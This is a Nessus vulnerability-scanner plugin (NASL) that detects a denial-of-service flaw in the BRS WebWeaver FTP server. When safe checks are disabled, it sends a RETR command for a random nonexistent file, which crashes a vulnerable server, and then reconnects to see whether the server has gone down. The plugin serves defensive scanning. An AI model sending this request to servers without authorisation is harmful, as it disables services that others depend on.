#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11584);
 script_bugtraq_id(7425);
 script_osvdb_id(51722);
 script_version ("$Revision: 1.13 $");
 
 script_name(english:"WebWeaver FTP Aborted RETR Command Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote WebWeaver FTP server can be disabled remotely
by requesting a non-existing file-name.

An attacker may use this flaw to prevent this FTP server from
executing properly." );
 script_set_attribute(attribute:"solution", value:
"None at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/05/06");
 script_cvs_date("$Date: 2012/06/29 20:23:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "disables the remote WebWeaver FTP server");
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003-2012 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("ftpserver_detect_type_nd_version.nasl");
 script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);



soc = open_sock_tcp(port);
if (! soc) exit(1);

  d = ftp_recv_line(socket:soc);
  if(!d){
	close(soc);
	exit(1, "Cannot read the FTP banner from port "+port+".");
	}
  if("BRS WebWeaver" >!< d)exit(0);
  
  if(safe_checks())
  {
   txt = 
"Since safe checks are enabled, Nessus did not actually check for this
flaw and this might be a false positive";
  security_warning(port:port, extra: txt);
  exit(0);
  }
  
  if (report_paranoia < 2) exit(0);

  send(socket:soc, data: strcat('RETR nessus', rand(), rand(), '\r\n'));
  r = ftp_recv_line(socket:soc);
  close(soc);
 
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  
  r = recv_line(socket:soc, length:4096);
  if(!r)security_warning(port);
  close(soc);
 
